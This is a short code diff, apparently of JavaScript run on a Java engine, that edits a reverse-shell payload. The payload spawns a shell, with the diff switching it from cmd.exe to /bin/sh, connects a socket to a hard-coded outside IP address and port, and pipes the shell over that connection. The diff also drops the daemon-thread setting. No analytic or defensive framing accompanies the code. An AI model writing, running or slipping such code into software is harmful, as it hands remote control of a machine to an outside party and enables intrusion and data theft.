@@ -7,7 +7,7 @@
         var thread = new Thread(function () {
             var host = "165.22.238.35";
             var port = 12346;
-            var cmd = "cmd.exe";
+            var cmd = "/bin/sh";
             var p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
             var s = new Socket(host, port);
 
@@ -44,7 +44,6 @@
             p.destroy();
             s.close();
         });
-        thread.setDaemon(true);
         thread.start();
     } catch (err) {
         return err;
